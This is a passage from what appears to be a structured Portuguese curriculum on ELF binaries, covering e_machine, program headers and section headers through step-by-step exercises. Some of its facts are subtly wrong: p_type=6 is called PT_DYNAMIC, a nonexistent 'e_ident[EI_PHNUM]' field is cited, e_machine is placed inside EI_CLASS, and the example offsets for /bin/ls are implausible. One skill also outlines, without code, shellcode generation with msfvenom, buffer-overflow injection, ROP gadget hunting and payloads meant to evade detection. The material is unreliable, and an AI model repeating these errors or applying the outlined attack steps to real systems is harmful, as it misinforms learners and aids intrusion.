                              "practicalExample": "Analise /bin/ls em um sistema Linux x86_64: extraia e_machine=0x3E (62), confirme AMD64, então rode 'objdump -d /bin/ls -M intel' para disassemblagem válida. Repita com um binário ARM64 baixado.",
                              "finalVerifications": [
                                "Identifica e_machine corretamente em binários ELF sem ferramentas auxiliares.",
                                "Mapeia 4+ valores comuns para arquiteturas exatas.",
                                "Executa disassemblagem apropriada via objdump para x86/ARM sem erros.",
                                "Detecta mismatches entre host e binário target.",
                                "Explica endianness impacto na leitura de e_machine.",
                                "Cria tabela de referência funcional para uso rápido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração manual de e_machine (100% correto em 5 testes).",
                                "Velocidade: <2 min por binário completo (extração + mapeio + disass).",
                                "Conhecimento de 6+ valores e_machine além dos comuns.",
                                "Uso correto de flags objdump/readelf por arch.",
                                "Explicação clara de associações ferramenta-arch.",
                                "Identificação de erros comuns em cenários reais."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Entender instruções por arch.",
                                "Sistemas Operacionais: Loaders ELF e compatibilidade binária.",
                                "Segurança Cibernética: Análise de malware cross-platform.",
                                "Engenharia de Software: Cross-compilation e portability.",
                                "Redes: Protocolos que dependem de arch (ex: exploits ROP)."
                              ],
                              "realWorldApplication": "Em análise forense digital ou reverse engineering de malware, identificar rapidamente a arquitetura via e_machine permite selecionar o disassembler correto, acelerando a dissecação de binários suspeitos em incidentes de segurança."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.3.2",
                            "name": "Avaliar Compatibilidade e Exploração",
                            "description": "Analisar como e_machine impacta injeção de shellcode ou ROP, verificando mismatches de arquitetura em binários para detecção de engenharia reversa ou modificações maliciosas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e Extrair o Campo e_machine de um Binário ELF",
                                  "subSteps": [
                                    "Use uma ferramenta como readelf ou hexdump para inspecionar o cabeçalho ELF.",
                                    "Navegue até o offset 0x12 (18 em decimal) no identificador EI_CLASS para encontrar e_machine.",
                                    "Extraia o valor de 2 bytes em little-endian (ex: 0x03 para x86).",
                                    "Converta o valor hexadecimal para decimal e consulte a tabela de arquiteturas ELF.",
                                    "Anote o valor e a arquitetura correspondente em um relatório."
                                  ],
                                  "verification": "Confirme o valor extraído comparando com a saída de `readelf -h binario.elf | grep Machine`.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Binário ELF de exemplo (ex: /bin/ls), readelf, hexdump, documentação ELF man pages.",
                                  "tips": "Sempre verifique o magic number no início para confirmar formato ELF válido.",
                                  "learningObjective": "Identificar e extrair precisamente o campo e_machine do cabeçalho ELF.",
                                  "commonMistakes": "Confundir offset de e_machine com e_ident ou ignorar endianness."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear e_machine para Arquiteturas e Verificar Compatibilidade Local",
                                  "subSteps": [
                                    "Consulte a especificação ELF (ex: valores: 0x03=Intel 80386, 0x28=ARM).",
                                    "Execute `uname -m` no sistema host para obter a arquitetura nativa.",
                                    "Compare e_machine do binário com a arquitetura do host.",
                                    "Teste execução com `file binario.elf` e `./binario.elf` para observar erros de incompatibilidade.",
                                    "Documente se há match (compatível) ou mismatch (incompatível)."
                                  ],
                                  "verification": "O binário executa sem erros de 'Exec format error' se compatível.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "readelf, uname, file command, tabela de códigos e_machine (de elf.h ou docs).",
                                  "tips": "Use um VM com arquitetura diferente para testar mismatches reais.",
                                  "learningObjective": "Mapear valores e_machine a arquiteturas e avaliar compatibilidade sistêmica.",
                                  "commonMistakes": "Ignorar variantes como x86_64 (0x3E) vs x86 (0x03)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Impacto em Injeção de Shellcode e ROP Chains",
                                  "subSteps": [
                                    "Gere ou obtenha shellcode para uma arquitetura específica (ex: x86 com msfvenom).",
                                    "Tente injetar shellcode em um binário ELF de arquitetura diferente via exploit simples (ex: buffer overflow).",
                                    "Observe falhas: instruções inválidas causam SIGILL ou crashes.",
                                    "Para ROP, verifique gadgets com ROPgadget em binários mismatched.",
                                    "Registre como mismatch previne execução de payloads maliciosos."
                                  ],
                                  "verification": "Shellcode injetado falha com segmentation fault ou illegal instruction em mismatch.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "msfvenom, ROPgadget, GDB para debugging, binários ELF de arquiteturas variadas.",
                                  "tips": "Use GDB com `catch signal SIGILL` para capturar falhas de instrução inválida.",
                                  "learningObjective": "Compreender como mismatches de e_machine bloqueiam explorações shellcode/ROP.",
                                  "commonMistakes": "Testar shellcode na mesma arquitetura, mascarando o problema."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detectar Mismatches para Identificar Engenharia Reversa ou Modificações Maliciosas",
                                  "subSteps": [
                                    "Modifique manualmente e_machine em um binário com hex editor (ex: mudar 0x3E para 0x03).",
                                    "Analise o binário modificado com readelf e tente executar.",
                                    "Compare hashes ou assinaturas antes/depois para detectar tampering.",
                                    "Simule cenário de malware: injete payload mismatched para bypass detecção.",
                                    "Crie um relatório de detecção destacando mismatch como indicador de malícia."
                                  ],
                                  "verification": "Relatório lista mismatch e impactos potenciais em segurança.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Hex editor (xxd ou bless), readelf, sha256sum para hashes, binários de teste.",
                                  "tips": "Automatize detecção com script Python usando pefile ou pyelftools.",
                                  "learningObjective": "Usar e_machine para detectar modificações maliciosas ou engenharia reversa.",
                                  "commonMistakes": "Alterar apenas e_machine sem ajustar seções de código, levando a crashes prematuros."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Análise e Praticar em Cenários Reais",
                                  "subSteps": [
                                    "Analise um binário real de malware (ex: de VirusTotal) focando e_machine.",
                                    "Crie um checklist para avaliação rotineira de compatibilidade/exploração.",
                                    "Teste cross-arquitetura com QEMU para emulação.",
                                    "Discuta cenários: shellcode multi-arq ou ROP adaptativo.",
                                    "Atualize relatório com recomendações de mitigação."
                                  ],
                                  "verification": "Checklist aplicada corretamente a pelo menos 2 binários adicionais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Amostras de malware (VirusShare), QEMU, checklist template.",
                                  "tips": "Integre com ferramentas como Ghidra para análise estática completa.",
                                  "learningObjective": "Aplicar análise de e_machine em fluxos de trabalho de segurança reais.",
                                  "commonMistakes": "Subestimar importância em ambientes multi-arq como cloud."
                                }
                              ],
                              "practicalExample": "Em um incidente de segurança, um binário ELF com e_machine=0x28 (ARM) é encontrado em um servidor x86_64. Extrair e_machine revela mismatch. Tentativa de injetar shellcode x86 falha com SIGILL, confirmando que modificações maliciosas (ex: engenharia reversa para ROP) são detectáveis pelo incompatibilidade arquitetural, prevenindo execução de payload.",
                              "finalVerifications": [
                                "e_machine extraído e mapeado corretamente para arquitetura.",
                                "Compatibilidade com host verificada via execução e erros observados.",
                                "Impacto em shellcode/ROP demonstrado com falhas em mismatches.",
                                "Módulo modificado detectado como malicioso via mismatch.",
                                "Relatório completo com checklist e recomendações.",
                                "Testes em pelo menos 3 binários variados realizados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração e interpretação de e_machine (100% match com readelf).",
                                "Demonstração clara de falhas em injeções mismatched.",
                                "Qualidade do relatório: inclui valores, impactos e mitigação.",
                                "Cobertura de substeps: todos completos e documentados.",
                                "Criatividade em cenários: uso de VMs/QEMU para testes reais.",
                                "Compreensão conceitual: explica por que mismatch bloqueia explorações."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura de Computadores: Entender instruções por arquitetura.",
                                "Engenharia de Software: Análise estática de binários e formatos executáveis.",
                                "Redes e Sistemas Operacionais: Execução cross-platform e emulação.",
                                "Criptografia e Forense Digital: Detecção de tampering via headers."
                              ],
                              "realWorldApplication": "Em equipes de resposta a incidentes (IR), analistas usam verificação de e_machine para identificar binários maliciosos modificados em ataques de supply-chain ou malware cross-arq, prevenindo injeções de shellcode em ambientes heterogêneos como IoT ou cloud multi-plataforma."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.3",
                    "name": "Seções e Headers de Programa no ELF",
                    "description": "Explicação de section headers, program headers e seu papel na análise e carregamento de executáveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.3.1",
                        "name": "Program Headers no ELF",
                        "description": "Os Program Headers, organizados na Program Header Table (PHT), definem segmentos do arquivo executável ELF que o loader do sistema operacional deve carregar na memória, incluindo tipos como PT_LOAD (para código e dados), PT_DYNAMIC (para informações de linking dinâmico) e PT_INTERP (para o interpretador). Cada header contém campos como p_type, p_offset, p_vaddr, p_filesz e p_memsz, essenciais para o mapeamento de memória durante o carregamento.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.1.1",
                            "name": "Identificar a Program Header Table no cabeçalho ELF",
                            "description": "Localizar o offset e o número de entradas da PHT usando o campo e_phoff e e_phnum do ELF Header com ferramentas como readelf ou hexdump, entendendo como o loader usa essas informações para inicializar o processo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura do ELF Header e campos relevantes",
                                  "subSteps": [
                                    "Ler a especificação ELF (capítulo sobre ELF Header).",
                                    "Identificar os campos e_phoff (offset da Program Header Table) e e_phnum (número de entradas na PHT).",
                                    "Memorizar os offsets fixos dos campos no ELF Header (e_phoff em offset 0x20, e_phnum em 0x2C para ELF64).",
                                    "Entender que e_phoff é um endereço de arquivo onde inicia a PHT.",
                                    "Notar diferenças entre ELF32 e ELF64."
                                  ],
                                  "verification": "Desenhar um diagrama do ELF Header destacando e_phoff e e_phnum com offsets corretos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Especificação ELF (PDF oficial)",
                                    "Diagrama do ELF Header (imagem ou ferramenta como draw.io)"
                                  ],
                                  "tips": "Use little-endian para interpretação em arquiteturas x86/x64 comuns.",
                                  "learningObjective": "Dominar a localização exata e o significado de e_phoff e e_phnum no ELF Header.",
                                  "commonMistakes": [
                                    "Confundir e_phoff com e_shoff (Section Header Table).",
                                    "Ignorar a arquitetura (32/64 bits) ao calcular offsets."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Obter e preparar um binário ELF de exemplo",
                                  "subSteps": [
                                    "Compilar um programa C simples em ELF (gcc hello.c -o hello).",
                                    "Verificar que é ELF com file hello.",
                                    "Copiar um binário do sistema como /bin/ls para análise.",
                                    "Criar uma cópia local para evitar alterações no sistema.",
                                    "Confirmar permissões de leitura."
                                  ],
                                  "verification": "Executar 'file binario.elf' e confirmar 'ELF 64-bit LSB executable'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC ou compilador",
                                    "Binário ELF existente (/bin/ls)"
                                  ],
                                  "tips": "Use binários estáticos para simplicidade inicial (gcc -static).",
                                  "learningObjective": "Preparar um artefato real para análise prática.",
                                  "commonMistakes": [
                                    "Analisar binários não-ELF (como PE no Windows).",
                                    "Usar binários corrompidos ou sem headers."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o ELF Header com readelf",
                                  "subSteps": [
                                    "Executar 'readelf -h binario.elf' para visualizar o header.",
                                    "Localizar as linhas 'Entry point address', 'Start of program headers' (e_phoff) e 'Number of program headers' (e_phnum).",
                                    "Anotar os valores numéricos de e_phoff e e_phnum.",
                                    "Comparar com documentação para validar.",
                                    "Executar 'readelf -l binario.elf' para ver a PHT completa."
                                  ],
                                  "verification": "Citar corretamente os valores de e_phoff e e_phnum do output.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta readelf (instalada via binutils)",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use 'readelf -hW' para output largo se necessário.",
                                  "learningObjective": "Usar readelf para extrair e interpretar campos do ELF Header.",
                                  "commonMistakes": [
                                    "Interpretar decimais como hexadecimais incorretamente.",
                                    "Confundir program headers com section headers (-l vs -S)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar manualmente com hexdump e entender o loader",
                                  "subSteps": [
                                    "Executar 'hexdump -C -s <e_phoff> -n 64 binario.elf' para ver bytes da PHT.",
                                    "Calcular offset: hexdump -s 0x20 binario.elf | head -1 para ver e_phoff raw.",
                                    "Interpretar bytes de e_phnum (little-endian).",
                                    "Explicar como o loader (kernel) usa e_phoff para mapear segments na memória.",
                                    "Simular: loader lê ELF Header → pula para e_phoff → carrega e_phnum headers."
                                  ],
                                  "verification": "Navegar manualmente ao offset e_phoff e descrever o primeiro program header (p_type=PT_LOAD).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Hexdump ou xxd",
                                    "Readelf para referência"
                                  ],
                                  "tips": "Use 'xxd binario.elf | less' para navegação interativa.",
                                  "learningObjective": "Validar ferramentas com inspeção raw e compreender o processo de loading.",
                                  "commonMistakes": [
                                    "Erro em endianness ao ler multi-byte values.",
                                    "Não alinhar offsets corretamente (PHT é alinhada a page size)."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar em múltiplos binários e sintetizar conhecimento",
                                  "subSteps": [
                                    "Analisar 3 binários diferentes (estático, dinâmico, 32-bit).",
                                    "Comparar valores de e_phoff e e_phnum entre eles.",
                                    "Escrever um script bash simples para extrair e_phoff automaticamente.",
                                    "Documentar diferenças observadas.",
                                    "Explicar impacto em cenários de segurança (ex: ASLR)."
                                  ],
                                  "verification": "Criar relatório com tabelas de valores para cada binário.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Múltiplos binários ELF",
                                    "Editor de texto ou Markdown"
                                  ],
                                  "tips": "Teste em Docker para ambientes controlados.",
                                  "learningObjective": "Generalizar o conhecimento para variações reais.",
                                  "commonMistakes": [
                                    "Generalizar de um único exemplo sem variações.",
                                    "Ignorar flags como e_phentsize."
                                  ]
                                }
                              ],
                              "practicalExample": "No binário /bin/ls (ELF64): 'readelf -h /bin/ls' mostra e_phoff=64 (0x40), e_phnum=10. 'hexdump -C -s 64 -n 256 /bin/ls' revela os 10 program headers iniciando com p_type=6 (PT_DYNAMIC), permitindo ao loader mapear .text, .data etc. na memória.",
                              "finalVerifications": [
                                "Identificar corretamente e_phoff e e_phnum em qualquer ELF via readelf.",
                                "Navegar manualmente à PHT com hexdump usando o offset exato.",
                                "Explicar o fluxo: kernel lê ELF Header → usa e_phoff/e_phnum para carregar segments.",
                                "Detectar diferenças entre ELF32/64 e estático/dinâmico.",
                                "Validar PHT alinhamento e tamanho (e_phentsize * e_phnum).",
                                "Aplicar em binário desconhecido sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de campos (100% correto).",
                                "Uso correto e interpretação de ferramentas (readelf/hexdump).",
                                "Explicação clara do papel no processo de loading do OS.",
                                "Capacidade de análise manual raw sem dependência total de ferramentas.",
                                "Generalização para múltiplos cenários (taxa de acerto >90%).",
                                "Documentação estruturada e sem erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismo de execve() e mmapping de segments.",
                                "Programação em C/Assembly: Manipulação de headers em loaders customizados.",
                                "Segurança Computacional: Análise de binários para exploits em PT_LOAD segments.",
                                "Arquitetura de Computadores: Endianness e alinhamento de memória.",
                                "Engenharia de Software: Ferramentas de build (ld, gcc) e formatos executáveis."
                              ],
                              "realWorldApplication": "Em análise forense de malware, identificar PHT para mapear código malicioso injetado em segments; em desenvolvimento de ferramentas de segurança como detecção de binários corrompidos; debugging de falhas de loading em containers Docker ou cross-compilation."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.2",
                            "name": "Interpretar campos de um Program Header",
                            "description": "Analisar campos individuais como p_flags (permissões de leitura/escrita/execução), p_align (alinhamento de memória) e p_filesz vs p_memsz (tamanho em arquivo vs memória), simulando o processo de carregamento em um executável ELF real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e Examinar a Estrutura Geral do Program Header",
                                  "subSteps": [
                                    "Execute 'readelf -l <arquivo_elf>' para listar os Program Headers (PT_LOAD, PT_DYNAMIC, etc.).",
                                    "Identifique campos chave: p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align.",
                                    "Registre o número de Program Headers no campo e_ident[EI_PHNUM].",
                                    "Compare com 'objdump -p <arquivo_elf>' para validação cruzada.",
                                    "Anote o tamanho de cada header (geralmente 32 ou 64 bytes via e_phentsize)."
                                  ],
                                  "verification": "Liste corretamente todos os Program Headers de um binário ELF real usando readelf e identifique pelo menos 3 campos principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta readelf ou objdump",
                                    "Binário ELF exemplo como /bin/ls ou hello_world compilado"
                                  ],
                                  "tips": [
                                    "Use -W para largura total no readelf.",
                                    "Comece com binários estáticos para simplicidade."
                                  ],
                                  "learningObjective": "Compreender a localização e estrutura básica dos Program Headers em um arquivo ELF.",
                                  "commonMistakes": [
                                    "Confundir Program Headers com Section Headers.",
                                    "Ignorar o formato 32-bit vs 64-bit.",
                                    "Não verificar endianness (little-endian padrão)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar o Campo p_flags (Permissões)",
                                  "subSteps": [
                                    "Decodifique p_flags como bitfield: bit 0 (1=execute), bit 1 (2=write), bit 2 (4=read).",
                                    "Exemplo: p_flags=5 (101b) significa read+execute (RX), comum para código.",
                                    "Relacione com flags do mmap: PROT_READ, PROT_WRITE, PROT_EXEC.",
                                    "Identifique violações de segurança como RWX (7=111b).",
                                    "Verifique consistência com seções subjacentes (ex: .text é RX)."
                                  ],
                                  "verification": "Explique o significado de p_flags=5, 7 e 4, e relacione com políticas W^X.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "readelf output de binários com diferentes flags",
                                    "Documentação ELF man pages"
                                  ],
                                  "tips": [
                                    "Máscara binária: p_flags & 1 para execute.",
                                    "Ferramentas como detect-it-easy para flags visuais."
                                  ],
                                  "learningObjective": "Analisar permissões de memória definidas por p_flags e suas implicações de segurança.",
                                  "commonMistakes": [
                                    "Interpretar como octal em vez de decimal.",
                                    "Esquecer que read é implícito em alguns casos.",
                                    "Confundir com st_flags em Symbol Table."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar p_filesz, p_memsz e p_align",
                                  "subSteps": [
                                    "Compare p_filesz (bytes no arquivo) vs p_memsz (bytes na memória, p_memsz >= p_filesz).",
                                    "Entenda BSS: se p_memsz > p_filesz, zero-init o resto.",
                                    "Examine p_align: potência de 2 (ex: 0x1000=4KB), deve alinhar p_offset, p_vaddr e p_paddr.",
                                    "Calcule alinhamento: p_vaddr % p_align == 0 e p_offset % p_align == 0.",
                                    "Note diferenças em PIE (Position Independent Executable) onde p_vaddr=0."
                                  ],
                                  "verification": "Para um PT_LOAD com p_filesz=1234, p_memsz=2000, p_align=4096, descreva o carregamento.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Hex editor como xxd ou bless",
                                    "Binários ELF com BSS como um programa com variáveis globais não inicializadas"
                                  ],
                                  "tips": [
                                    "p_align afeta ASLR; teste com 'readelf -l --wide'.",
                                    "Use gdb 'info proc mappings' pós-carregamento."
                                  ],
                                  "learningObjective": "Diferenciar tamanhos em disco vs memória e validar alinhamentos para carregamento correto.",
                                  "commonMistakes": [
                                    "Assumir p_filesz sempre == p_memsz.",
                                    "Ignorar alinhamento levando a crashes simulados.",
                                    "Confundir p_paddr (físico, raramente usado)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular o Processo de Carregamento de um Program Header",
                                  "subSteps": [
                                    "Inicie simulação: leia de p_offset por p_filesz bytes.",
                                    "Mapeie para p_vaddr na memória virtual, aplicando p_align.",
                                    "Preencha p_memsz - p_filesz com zeros se necessário.",
                                    "Aplique p_flags para permissões (mprotect simulado).",
                                    "Valide: verifique overlaps entre múltiplos PT_LOAD e ordem crescente de p_vaddr."
                                  ],
                                  "verification": "Simule carregamento de um PT_LOAD completo e descreva o estado da memória resultante.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Script Python para simulação mmap-like",
                                    "GDB ou strace em execução real"
                                  ],
                                  "tips": [
                                    "Ordem de carregamento: crescente p_vaddr.",
                                    "Teste com ld.so para dynamic loaders."
                                  ],
                                  "learningObjective": "Simular o loader do kernel ao carregar segmentos ELF na memória.",
                                  "commonMistakes": [
                                    "Carregar sem alinhar offsets.",
                                    "Esquecer zero-init de BSS.",
                                    "Ignorar múltiplos headers sobrepostos."
                                  ]
                                }
                              ],
                              "practicalExample": "Em /bin/ls (x86_64 ELF): PT_LOAD[1] com p_flags=5 (RX), p_offset=0x400000, p_vaddr=0x400000, p_filesz=16896, p_memsz=16960, p_align=4096. Simule: copie 16896 bytes de offset 0x400000 para 0x400000 (alinhado 4KB), zero os 64 bytes extras até 16960, aplique PROT_READ|PROT_EXEC. Isso carrega o .text segment.",
                              "finalVerifications": [
                                "Decodifica corretamente p_flags para permissões (ex: 5=RX).",
                                "Explica por que p_memsz > p_filesz e como tratar BSS.",
                                "Valida alinhamento: p_vaddr e p_offset múltiplos de p_align.",
                                "Simula carregamento sem overlaps ou desalinhamentos.",
                                "Identifica implicações de segurança como RWX segments.",
                                "Compara múltiplos PT_LOAD em um binário real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de todos os campos chave (100% correto).",
                                "Profundidade na explicação de diferenças p_filesz/p_memsz (com exemplo BSS).",
                                "Correta aplicação de bitfields em p_flags e relação com mmap.",
                                "Validação de alinhamentos com cálculos matemáticos.",
                                "Simulação completa de carregamento com verificação de erros comuns.",
                                "Integração de contexto de segurança (ex: DEP, W^X)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de mmap e mprotect no kernel Linux.",
                                "Segurança Computacional: Detecção de exploits em binários maliciosos via headers.",
                                "Arquitetura de Computadores: Gerenciamento de memória virtual e alinhamentos de página.",
                                "Programação em Assembly: Mapeamento de .text/.data para vaddrs.",
                                "Engenharia Reversa: Uso de tools como Ghidra/Radare2 para headers ELF."
                              ],
                              "realWorldApplication": "Em análise de malware ELF (ex: Mirai botnet), interpretar Program Headers permite mapear shellcode em memória, detectar injeções RWX e simular execução para extração de payloads, essencial em incident response e forensics digitais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.3",
                            "name": "Explicar o papel dos Program Headers no carregamento",
                            "description": "Descrever como o kernel Linux usa os PT_LOAD para mapear páginas na memória virtual, resolvendo endereços virtuais e aplicando proteções, com exemplos de análise em binários maliciosos para detectar payloads ocultos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral dos Program Headers no ELF",
                                  "subSteps": [
                                    "Localize a seção de Program Headers no cabeçalho ELF usando ferramentas como readelf.",
                                    "Identifique os campos principais: p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags e p_align.",
                                    "Diferencie Program Headers de Section Headers, focando no seu papel no carregamento dinâmico.",
                                    "Analise um binário ELF simples com 'readelf -l binary' para visualizar os headers.",
                                    "Registre os valores de um PT_LOAD header em um binário exemplo."
                                  ],
                                  "verification": "Execute 'readelf -l' em um binário ELF e explique verbalmente ou por escrito os campos de um PT_LOAD.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta readelf (instalada no Linux), binário ELF exemplo (ex: /bin/ls), editor de texto.",
                                  "tips": "Sempre compare com a documentação ELF para validar offsets e tamanhos.",
                                  "learningObjective": "Dominar a estrutura e campos dos Program Headers para análise inicial.",
                                  "commonMistakes": "Confundir p_offset (no arquivo) com p_vaddr (na memória); ignorar p_align."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Tipos de Program Headers e Foco em PT_LOAD",
                                  "subSteps": [
                                    "Liste os tipos comuns: PT_NULL, PT_LOAD, PT_DYNAMIC, PT_INTERP, PT_NOTE, PT_SHLIB, PT_PHDR.",
                                    "Estude PT_LOAD em detalhes: como define segmentos carregáveis com p_flags (R, W, X).",
                                    "Use objdump -p para inspecionar headers e identifique múltiplos PT_LOAD em um binário.",
                                    "Simule mapeamento: calcule como p_vaddr é usado para mmap pelo kernel.",
                                    "Compare PT_LOAD com outros tipos em um binário real."
                                  ],
                                  "verification": "Identifique e descreva todos PT_LOAD em um binário, listando flags e tamanhos corretos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Objdump, readelf, binário ELF com múltiplos segmentos (ex: compilar com -Wl,--eh-frame-hdr).",
                                  "tips": "Lembre-se: PT_LOAD mapeia páginas; flags definem proteções via mprotect.",
                                  "learningObjective": "Entender o papel específico de PT_LOAD no carregamento de segmentos.",
                                  "commonMistakes": "Assumir um único PT_LOAD; ignorar que p_memsz pode ser maior que p_filesz (para BSS)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Processo de Carregamento pelo Kernel Linux",
                                  "subSteps": [
                                    "Descreva o fluxo: kernel lê e_phnum/ e_phoff, itera PT_LOAD com mmap.",
                                    "Explique resolução de endereços virtuais: p_vaddr alinhado a páginas (geralmente 4KB).",
                                    "Detalhe aplicação de proteções: mprotect com PROT_READ/WRITE/EXEC baseado em p_flags.",
                                    "Simule com strace em 'execve' para observar syscalls mmap/mprotect.",
                                    "Registre diferenças entre p_filesz (arquivo) e p_memsz (memória zerada)."
                                  ],
                                  "verification": "Explique o processo passo a passo e trace um execve mostrando mmap calls.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Strace, binário ELF, documentação kernel (man execve, fs/binfmt_elf.c).",
                                  "tips": "Use 'strace -e trace=mmap,mprotect ./binary' para visualização prática.",
                                  "learningObjective": "Mapear o mecanismo exato de carregamento usando PT_LOAD.",
                                  "commonMistakes": "Confundir endereço virtual com físico; esquecer alinhamento de página."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Conhecimento em Análise de Binários Maliciosos",
                                  "subSteps": [
                                    "Identifique payloads ocultos: verifique discrepâncias em p_filesz vs p_memsz ou flags suspeitas.",
                                    "Analise um sample malicioso: use readelf para detectar PT_LOAD com X em áreas de dados.",
                                    "Simule detecção: procure por shellcode em gaps entre segmentos.",
                                    "Compare com binários benignos para padrões de ofuscação.",
                                    "Documente achados em relatório de análise."
                                  ],
                                  "verification": "Analise um binário malicioso fornecido e identifique anomalias em PT_LOAD.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Samples maliciosos seguros (ex: de MalwareBazaar ou VirusTotal), readelf, hex editor (xxd).",
                                  "tips": "Procure por PT_LOAD com p_flags=7 (RWX) como red flag em malware.",
                                  "learningObjective": "Usar PT_LOAD para detectar técnicas de evasão em malware.",
                                  "commonMistakes": "Ignorar headers não-PT_LOAD que podem carregar código; análise sem contexto de ASLR."
                                }
                              ],
                              "practicalExample": "Em um binário ELF malicioso, um PT_LOAD com p_vaddr=0x401000, p_filesz=0x1000, p_memsz=0x2000 e p_flags=7 (RWX) indica possível shellcode no espaço zerado (0x1000-0x2000), mapeado executável pelo kernel, permitindo injeção sem detecção inicial.",
                              "finalVerifications": [
                                "Explicar corretamente o fluxo de carregamento usando PT_LOAD em um diagrama.",
                                "Analisar headers de um binário real e identificar todos PT_LOAD com detalhes.",
                                "Trace syscalls de mmap/mprotect em execve de um ELF.",
                                "Detectar anomalia em sample malicioso (ex: RWX inesperado).",
                                "Descrever impacto de desalinhamento em p_vaddr.",
                                "Comparar carregamento ELF vs PE em termos de headers."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de campos PT_LOAD (90% correto).",
                                "Capacidade de traçar carregamento kernel com syscalls corretas.",
                                "Identificação de 3+ anomalias em binário malicioso.",
                                "Uso correto de ferramentas (readelf, objdump, strace).",
                                "Explicação clara de proteções e mapeamento virtual.",
                                "Relatório prático com exemplos concretos."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de mmap e gerência de memória virtual.",
                                "Segurança Computacional: Detecção de exploits e análise de malware.",
                                "Arquitetura de Computadores: Proteções de página (NX bit, ASLR).",
                                "Programação em Assembly: Endereçamento virtual em binários carregados.",
                                "Redes: Análise de payloads em binários de rede maliciosos."
                              ],
                              "realWorldApplication": "Na cibersegurança, analistas de malware usam Program Headers para detectar payloads ocultos em ELF maliciosos, como em APTs Linux (ex: BPFDoor), identificando segmentos RWX suspeitos que evadem AVs durante o carregamento pelo kernel."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.2",
                        "name": "Section Headers no ELF",
                        "description": "Os Section Headers, na Section Header Table (SHT), descrevem seções granulares como .text (código executável), .data (dados inicializados), .bss (dados não inicializados) e .symtab (símbolos), usadas principalmente pelo linker estático, debuggers e ferramentas de análise estática, com campos como sh_name, sh_type, sh_flags e sh_offset.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.2.1",
                            "name": "Localizar e enumerar a Section Header Table",
                            "description": "Usar os campos e_shoff e e_shnum do ELF Header para acessar a SHT com objdump -h ou readelf -S, identificando seções por nome e offset no arquivo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Examinar o ELF Header para localizar e_shoff e e_shnum",
                                  "subSteps": [
